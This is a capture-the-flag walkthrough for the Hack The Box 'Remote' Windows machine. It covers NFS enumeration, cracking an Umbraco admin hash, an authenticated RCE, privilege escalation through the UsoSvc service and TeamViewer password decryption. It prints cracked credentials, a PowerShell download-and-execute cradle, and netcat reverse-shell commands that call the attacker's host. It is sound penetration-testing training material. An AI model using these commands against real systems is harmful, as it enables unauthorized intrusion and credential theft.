## Default Information
IP Address: 10.10.10.180\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.180    remote.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.180 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-25 10:17:07 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 445/tcp on 10.10.10.180                                   
Discovered open port 111/tcp on 10.10.10.180                                   
Discovered open port 135/tcp on 10.10.10.180                                   
Discovered open port 21/tcp on 10.10.10.180                                    
Discovered open port 80/tcp on 10.10.10.180                                    
Discovered open port 49666/tcp on 10.10.10.180                                 
Discovered open port 2049/tcp on 10.10.10.180 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21  | ftp | Microsoft ftpd | Open |
| 80  | http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
| 111 | rpcbind | 127 2-4 (RPC #100000) | Open |
| 135  | msrpc | Microsoft Windows RPC | Open |
| 445  | microsoft-ds | 127 | Open |
| 2049 | mountd |127 1-3 (RPC #100005) | Open |
| 49666| msrpc | Microsoft Windows RPC | Open |

### FTP Enumeration (Port 21)

Using nmap, we realize that we are able to do an anonymous login on FTP on port 21.

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_banner: 220 Microsoft FTP Service
```

However, after the anonymous login, we are unable to list any directories or files from the FTP client.

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> 
```

### Web Enumeration (Port 80)
We will first use Gobuster to find the accessible endpoints from http://remote.htb

```
http://10.10.10.180:80/Home                 (Status: 200) [Size: 6703]
http://10.10.10.180:80/Default.aspx         (Status: 200) [Size: 6693]
http://10.10.10.180:80/Home.aspx            (Status: 200) [Size: 6703]
http://10.10.10.180:80/blog                 (Status: 200) [Size: 5001]
http://10.10.10.180:80/blog.aspx            (Status: 200) [Size: 5001]
http://10.10.10.180:80/contact.aspx         (Status: 200) [Size: 7880]
http://10.10.10.180:80/contact              (Status: 200) [Size: 7880]
http://10.10.10.180:80/default.aspx         (Status: 200) [Size: 6693]
http://10.10.10.180:80/home.aspx            (Status: 200) [Size: 6703]
http://10.10.10.180:80/home                 (Status: 200) [Size: 6703]
http://10.10.10.180:80/install              (Status: 302) [Size: 126] [--> /umbraco/]
http://10.10.10.180:80/intranet             (Status: 200) [Size: 3323]
http://10.10.10.180:80/intranet.aspx        (Status: 200) [Size: 3323]
http://10.10.10.180:80/master               (Status: 500) [Size: 3420]
http://10.10.10.180:80/master.aspx          (Status: 500) [Size: 3420]
http://10.10.10.180:80/people.aspx          (Status: 200) [Size: 6739]
http://10.10.10.180:80/people               (Status: 200) [Size: 6739]
http://10.10.10.180:80/person               (Status: 200) [Size: 2741]
http://10.10.10.180:80/person.aspx          (Status: 200) [Size: 2741]
http://10.10.10.180:80/product.aspx         (Status: 500) [Size: 3420]
http://10.10.10.180:80/product              (Status: 500) [Size: 3420]
http://10.10.10.180:80/products.aspx        (Status: 200) [Size: 5328]
http://10.10.10.180:80/products             (Status: 200) [Size: 5328]
http://10.10.10.180:80/umbraco              (Status: 200) [Size: 4040]
```
One of the interesting endpoint that we can find is http://remote.htb/umbraco. Visiting http://remote.htb/umbraco redirects us to a login page. Unfortunately, we are unable to login to this page using the default credentials. 

![Umbraco login](https://github.com/joelczk/writeups/blob/main/HTB/Images/Remote/umbraco_login.png)

Looking at exploitdb, there are several promising exploits for Umbraco, but all of them require that we have to be authenticated. This looks like a dead end.

### SMB Enumeration (Port 445)
Firstly, let us try to list the shares using smbmap. However, we realize that we are unable to authenticate to the smb server.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.180 -P 445 
[!] Authentication error on 10.10.10.180
```

Similarly using null authentication on smbmap fails as well. Using smbclient also gave us the same results.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.180 -P 445
[!] Authentication error on 10.10.10.180
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbclient -L\\ -N -I 10.10.10.180
session setup failed: NT_STATUS_ACCESS_DENIED
```

### mountd enumeration (Port 2049)

The nmap scan on port 2049 revealed that port 2049 has a network file system protocol and there is a /site_backups that is mounted on port 2049.

```
PORT     STATE SERVICE REASON          VERSION
2049/tcp open  mountd  syn-ack ttl 127 1-3 (RPC #100005)
| nfs-showmount: 
|_  /site_backups
```

Using the showmount command also gave us the same /site_backups that is mounted on port 2049, which can be accessible by anyone. 

```
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.10.180                                                                                    1 ⨯
Export list for 10.10.10.180:
/site_backups (everyone)
```

### Mounting NFS
Knowing that there is a NFS share /site_backups that can be accessible by anyone and thet port 2049 is a network file protocol, we will try to mount /site_backups directory onto our local machine.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/Desktop/remote  
```

From our research, we know that the hashed credentials for the login credentials of umbraco is stored in a database. From [here](https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials), we can see that we will be able to find the location of the Umbraco.sdf file storing our database credentials. 

```
┌──(kali㉿kali)-[~/Desktop/remote]
└─$ cat Web.config | grep sdf       
                <add name="umbracoDbDSN" connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;" providerName="System.Data.SqlServerCe.4.0" />
```

Since we know that the DataDirectory is the AppData directory,  we will navigate to the App_Data directory and check the contents of the Umbraco.sdf file. 

Using the cat command, we would realize that this is a binary file and there are some gibberish text that we are unable to read when we try to read the file. However, upon closer inspection, we realize that this file actually exposes information about the password hash.

![Hashed password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Remote/hashed_password.png)

Extracting out the strings, we have the following:

```
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

## Exploit
### Decrypting password hash
Looking at the hash values, we are able to know that this is encrypted using the SHA1 algorithm. Looking up the hash online, we are able to decrypt the password as ```baconandcheese```

![Decrypt hashed password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Remote/decrypt_hash.png)

Using the credentials, we are able to login to the Umbraco admin interface using the credentials, admin@htb.local:baconandcheese

### Authenticated RCE on Umbraco
Recalling previously that we were able to find an authenticated RCE exploit from exploitdb, since we are now able to gain authentication into the admin interface, we shall use this exploit. 

First, let us use a ping command to test if the exploit works. 

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c ping -a '10.10.16.8'           2 ⨯
Pinging 10.10.16.8 with 32 bytes of data:
Reply from 10.10.16.8: bytes=32 time=487ms TTL=63
Reply from 10.10.16.8: bytes=32 time=249ms TTL=63
Reply from 10.10.16.8: bytes=32 time=249ms TTL=63
Reply from 10.10.16.8: bytes=32 time=249ms TTL=63

Ping statistics for 10.10.16.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 249ms, Maximum = 487ms, Average = 308ms

```

From the wireshark output, the ping command has been received and the exploit works.

![Ping command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Remote/ping_command.png)

Next, we will try to use this exploit to create a reverse shell. To do that, we will be using Invoke-PowerShellTcp.ps1 script from Nishang. However, we have to modify the script by adding the following line at the end of the script so that the target machine will create a reverse connection to our local listener.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.8 -Port 4000
```

Afterwards, all we have to do is to execute the exploit script and we will be able to obtain a reverse shell.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c "powershell.exe" -a "IEX (New-Object Net.WebClient).downloadString('http://10.10.16.8:3000/shell.ps1')"
```
### Obtaining reverse shell
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.180] 49687
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```
### Obtaining user flag
```
PS C:\Users\Public> cat user.txt
<Redacted user flag>
PS C:\Users\Public> 
```

### Privilege Escalation to root
First, let us check the privileges that the user has. We realize that ```SeImpersonatePrivilege``` is enabled, this means that the machine may be potentially vulnerable to Juicy Potato exploit.

```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Next, let us check the Operating System of the machine using systeminfo. Unfortunately, this machine is operating on Windows Server 2019 which is not in the list of the affected versions of Windows for Juicy Potato Exploit. Hence, Juicy Potato exploit will not work for this case.

Additionally, kernel exploits seems unlikely for this server as there were serveral hotfixes that were being deployed already. 

```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4516115
                           [03]: KB4523204
                           [04]: KB4464455

```

Next we will use the PowerUp.ps1 script from the Powersploit [here](https://github.com/PowerShellMafia/PowerSploit) to check for any potential privilege escalation vector

```
PS C:\Users\Public> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8:3000/PowerUp.ps1');Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2848
ProcessId   : 3652
Name        : 3652
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

From the output, we are able to see that we might be able to use UsoSvc to escalate our privilege to that of the system adminstrator.

To exploit this, we would need to first upload nc.exe to our target server. Afterwards, we will be able to spawn a reverse shell using the following command.

```
PS C:\Users\Public> Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\Users\Public\nc.exe -e cmd.exe 10.10.16.8 2000'

ServiceAbused Command                                          
------------- -------                                          
UsoSvc        C:\Users\Public\nc.exe -e cmd.exe 10.10.16.8 2000
```

The reverse shell that is being spawned would then have SYSTEM privileges.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 2000
listening on [any] 2000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.180] 49698
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```

## Post-exploitation
### SYSTEM shell
One problem that we realize when we use the SYSTEM shell is that the SYSTEM shell that we have spawned only lasts for a few seconds before it will run into some error and the shell dies.

Let us try to exploit USOSvc using sc.exe instead of using the Invoke-ServiceAbuse command to see if the problem still persists.

First, let us stop the service.

```
PS C:\Users\Public> sc.exe stop USOSvc

SERVICE_NAME: USOSvc 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0xf
        WAIT_HINT          : 0x7530
```

Next, let us configure USOSvc to link the binPath to our reverse shell payload.

```
PS C:\Users\Public> sc.exe config USOSvc binPath="C:\Users\Public\nc.exe -e cmd.exe 10.10.16.8 2000"
[SC] ChangeServiceConfig SUCCESS
```

Afterwards, we will run ```sc.exe qc usosvc``` to verify that we have successfully changed the binPath

```
PS C:\Users\Public> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Public\nc.exe -e cmd.exe 10.10.16.8 2000
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

Lastly, all we have to do is to start usosvc. However, it turns out that the problem still persists :( (Feel free to lmk if u have any solution for this)

```
PS C:\Users\Public> sc.exe start usosvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### Using winpeas
The UsoSVC exploit is also picked up when we run winPEASx64.exe

```
???????????? Modifiable Services
? Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    UsoSvc: AllAccess, Start
```

### Decrypting passwords in teamviewer

If we were to use tasklist to get the list of running processes, we would be able to see that TeamViewer is being executed in the background. 

```
PS C:\> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...
TeamViewer_Service.exe        2220                            0     21,452 K
...
```

Next, we would need to obtain the version information of Team Viewer. To do so, we can navigate to C:\Program Files (x86)\TeamViewer. In this case, the version that we are looking at is version 7.

```
PS C:\Program Files (x86)\TeamViewer> dir


    Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/26/2022  11:25 AM                Version7  
```

For this exploit, we would need to dump out the password from the registry keys. To do so, we would need to navigate to the location storing the registry keys for version 7, which is HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7. Afterwards, we would have to dump out the SecurityPasswordAES. 
```
PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7> (get-itemproperty -path .).SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

However, what we notice is that the output are a integers and not strings. At the same time, for teamviewer versions lower than 9, they are vulnerable to [CVE-2019-18988](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). This vulnerability allows any attacker to decrypt the teamviewer registry keys due to hardcoded cryptographic keys stored in teamviewer that is being recycled in the affected versions.

We can easily use a python script to decrypt the password.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/remote]
└─$ python3 decrypt.py                                                                                           1 ⨯
[+] Found password: !R3m0te!
```

